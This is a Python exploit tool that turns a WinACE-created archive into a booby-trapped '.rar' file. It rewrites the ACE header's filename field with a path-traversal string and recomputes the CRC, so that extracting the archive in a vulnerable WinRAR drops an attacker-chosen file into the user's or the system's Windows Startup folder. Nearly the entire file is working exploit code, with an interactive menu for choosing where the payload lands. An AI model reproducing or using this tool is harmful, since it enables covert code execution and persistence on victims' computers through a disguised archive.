#! python3

import datetime
import os
import re
import struct
import binascii
import subprocess
import zlib 
import sys 
import argparse

class AceCRC32:
    """
    Calculate an ACE CRC-32 checksum.

    ACE CRC-32 uses the standard CRC-32 polynomial, bit ordering and
    initialization vector, but does not invert the resulting checksum.
    This implementation uses :meth:`zlib.crc32` with inverted state,
    inverted initialization vector and inverted output in order to
    construct ACE CRC-32 from standard CRC-32.

    >>> crc = AceCRC32()
    >>> crc += b"12345"
    >>> crc += b"6789"
    >>> crc.sum
    873187033
    >>> crc == 873187033
    True
    """

    def __init__(self, buf=b''):
        """
        Initialize and add bytes in *buf* into checksum.
        """
        self.__state = 0
        if len(buf) > 0:
            self += buf

    def __iadd__(self, buf):
        """
        Adding a buffer of bytes into the checksum, updating the rolling
        checksum from all previously added buffers.
        """
        self.__state = zlib.crc32(buf, self.__state)
        return self

    def __eq__(self, other):
        """
        Compare the checksum to a fixed value or another ACE CRC32 object.
        """
        return self.sum == other

    def __format__(self, format_spec):
        """
        Format the checksum for printing.
        """
        return self.sum.__format__(format_spec)

    def __str__(self):
        """
        String representation of object is hex value of checksum.
        """
        return "0x%08x" % self.sum

    @property
    def sum(self):
        """
        The final checksum.
        """
        return self.__state ^ 0xFFFFFFFF

class AceCRC16(AceCRC32):
    """
    Calculate an ACE CRC-16 checksum, which is actually just the lower 16 bits
    of an ACE CRC-32.

    >>> crc = AceCRC16()
    >>> crc += b"12345"
    >>> crc += b"6789"
    >>> crc.sum
    50905
    >>> crc == 50905
    True
    """
    def __str__(self):
        """
        String representation of object is hex value of checksum.
        """
        return "0x%04x" % self.sum

    @property
    def sum(self):
        """
        The checksum.
        """
        return super().sum & 0xFFFF

def ace_crc32(buf):
    """
    Return the ACE CRC-32 checksum of the bytes in *buf*.

    >>> ace_crc32(b"123456789")
    873187033
    """
    return AceCRC32(buf).sum

def ace_crc16(buf):
    """
    Return the ACE CRC-16 checksum of the bytes in *buf*.

    >>> ace_crc16(b"123456789")
    50905
    """
    return AceCRC16(buf).sum


def choose_payload():
    while True :
        print("Choose payload: ")
        print("\t\t(1) User's startup folder")
        print("\t\t(2) System startup folder")
        print("\t\t(3) Custom local location")
        print("\t\t(4) SMB location [not implemented]")
        print("\t\t(0) Exit")
        choice = input("Your choice: ")
        if len(choice) > 0:
            if choice[0] == "1":
                nfn = input("[User's startup folder] New filename: ")
                nfn = "C:\\C:C:../Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + nfn
                return nfn
            elif choice[0] == "2":
                nfn = input("[System startup folder] New filename: ")
                nfn = "C:\\C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"+nfn
                return nfn
            elif choice[0] == "3":
                nfn = input("[Custom local directory] New absolute path: ")
                nfn = "C:\\" + nfn 
                return nfn
            elif choice[0] == "4":
                continue
            elif choice[0] == "0":
                exit(0)
            else :
                continue

def usage():
    use = """Creating an ACE archive is protected by a patent. The only software that is allowed to create an ACE archive is WinACE.
        Please include WinACE executable in the arguments:
        ezwinrar -w \\path\\to\\WinAce\\winace.exe (default: C:\\Program Files (x86)\\WinAce\\winace.exe)
        """
    return use

def main(argv):

    parser = argparse.ArgumentParser()
    parser.add_argument("winace", default='"C:\\Program Files (x86)\\WinAce\\winace.exe"', nargs="?", help=usage())
    args = parser.parse_args()
    winace_path = args.winace
    
    print(winace_path)

    sfile = input("Choose a file: ")

    try:
        os.remove("step1.ace")
    except:
        pass

    p = subprocess.Popen("{} a -y step1 {}".format(winace_path, sfile), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    out, err = p.communicate()

    print("out:{}\r\nerr:{}".format(out,err))

    with open("step1.ace","rb") as f1:
        first_part = f1.read(0x35)
        buf = f1.read(4)
        old_hcrc, old_hsize = struct.unpack('<HH', buf)
        buf = f1.read(old_hsize)
        data = f1.read()

        htype, hflags = struct.unpack('<BH', buf[0:3])
        i = 3
        packsize, \
        origsize, = struct.unpack('<LL', buf[i:i+8])
        i += 8
        datetime, \
        attribs, \
        crc32, \
        comptype, \
        compqual, \
        params, \
        reserved1, \
        old_fnsz = struct.unpack('<LLLBBHHH', buf[i:i+20])
        i += 20

        old_fn = buf[i:]

        nfn = choose_payload()
        
        fnsz = len(nfn)

        new_header = struct.pack("<BH", htype, hflags) + \
                    struct.pack("<LL", packsize, origsize) + \
                    struct.pack("<LLLBBHHH", datetime, attribs, crc32, comptype, compqual, params, reserved1, fnsz) + bytes(nfn,'utf-8')
        
        hsize = len(new_header)
        hcrc = ace_crc16(new_header)

        payload = first_part + struct.pack("<HH",hcrc,hsize) + new_header + data

    nzipfn = input("New rar filename: ")

    with open(nzipfn, 'wb+') as f2:
        f2.write(payload)
    
    try:
        os.remove("step1.ace")
    except:
        pass

if __name__ == "__main__":
    main(sys.argv[1:])